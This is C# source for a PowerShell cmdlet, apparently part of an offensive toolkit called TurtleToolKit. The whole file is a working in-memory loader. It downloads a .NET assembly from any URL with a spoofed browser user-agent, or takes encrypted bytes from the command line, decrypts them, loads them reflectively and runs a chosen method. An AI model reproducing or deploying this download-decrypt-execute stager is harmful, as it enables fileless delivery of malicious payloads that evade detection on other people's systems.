using System.Management.Automation;
using System;
using System.Reflection;
using TurtleToolKitCrypt;
using System.Net;

namespace TurtleToolKit
{
    [Cmdlet(VerbsLifecycle.Invoke, "AssemblyLoader")] // <- seeting cmdlet name and verbs
    [Alias("IVNASM")] //<- cmdlet alias
    public class InvokeAssemblyLoader : Cmdlet
    {
        [Parameter(Mandatory = true)] [Alias("e")] public bool encrypted { get; set; }
        [Parameter(Mandatory = true)] [Alias("l")] public bool local { get; set; }
        [Parameter(Mandatory = true)] [Alias("path")] public string UriOrPath { get; set; }
        [Parameter(Mandatory = true)] [Alias("name")] public string namespce { get; set; }
        [Parameter(Mandatory = true)] [Alias("clas")] public string clss { get; set; }
        [Parameter(Mandatory = true)] [Alias("run")] public string methodToRun { get; set; }
        [Parameter(Mandatory = false)] [Alias("k")] public byte[] decryptKey { get; set; }
        [Parameter(Mandatory = false)] [Alias("encbyts")] public byte[] encryptedbytes { get; set; }
        [Parameter(Mandatory = false)] [Alias("ivk")] public byte[] initVector { get; set; }

        public string localPath; 
        public string remoteURI;
        private Cryptor cryptObj;

        protected override void BeginProcessing()
        {
            base.BeginProcessing();
            if (local)
            {
                localPath = UriOrPath;
                return;
            }
            remoteURI = UriOrPath;
            return;
        }

        // Process each item in pipeline
        protected override void ProcessRecord()
        {
            base.ProcessRecord();
            if (!local)
            {
                LoadRemoteAssembly(remoteURI, namespce, clss, methodToRun, encrypted);
                return;
            }
            LoadLocalAssembly(localPath, namespce, clss, methodToRun, encrypted);
            return;
        }



        // EndProcessing Used to clean up cmdlet
        protected override void EndProcessing() { base.EndProcessing(); }
        // Handle abnormal termination
        protected override void StopProcessing() { base.StopProcessing(); }

        public bool LoadRemoteAssembly(string uri,string name,string clss,string func, bool isEncrypted)
        {
            byte[] remoteByte;
            var wc = new WebClient();
            wc.Headers.Add("user-agent", "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/89.0.4389.114 Safari/537.36");
            // get bytes from uri
            remoteByte = wc.DownloadData(uri);
            try { 
                if (!isEncrypted)
                {
                    // perform loading
                    var ass = Assembly.Load(remoteByte);
                    var t = ass.GetType(name + "." + clss);
                    var c = Activator.CreateInstance(t);
                    var m = t.GetMethod(func);
                    m.Invoke(c, null);
                    return true;
                }
            } catch (Exception e)
            {
                throw e;
            }
            // below is if remote bytes are encryped
            try
            {
                cryptObj = new Cryptor(decryptKey, initVector);
                var decryptedBytes = cryptObj.DecryptBytes(remoteByte);
                if (decryptedBytes == null)
                {
                    Console.WriteLine("Failed to decrypt bytes");
                    return false;
                }
                // perform loading
                var ass = Assembly.Load(decryptedBytes);
                var t = ass.GetType(name + "." + clss);
                var c = Activator.CreateInstance(t);
                var m = t.GetMethod(func);
                m.Invoke(c, null);
                return true;
            }
            catch (Exception e)
            {
                throw e;
            }
        }
        public bool LoadLocalAssembly(string path, string name, string clss, string func,bool isEncrypted)
        {
            this.WriteWarning("If using local encryption only accepts bytes via cmdline on disk assembly must be non encrypted");
            if (!isEncrypted)
            {
                try
                {
                    var a = Assembly.LoadFile(path);
                    var t = a.GetType(name + "." + clss);
                    var c = Activator.CreateInstance(t);
                    var m = t.GetMethod(func);
                    m.Invoke(c, null);
                    return true;
                }
                catch (Exception e)
                {
                    throw e;
                }
            }
            // perform decryption
            try
            {
                cryptObj = new Cryptor(decryptKey, initVector);
                var decryptedBytes = cryptObj.DecryptBytes(encryptedbytes);
                if (decryptedBytes == null)
                {
                    Console.WriteLine("Failed to decrypt bytes");
                    return false;
                }
                // perform loading
                var ass = Assembly.Load(decryptedBytes);
                var t = ass.GetType(name + "." + clss);
                var c = Activator.CreateInstance(t);
                var m = t.GetMethod(func);
                m.Invoke(c, null);
                return true;
            }
            catch (Exception e)
            {
                throw e;
            }
        }
    }
}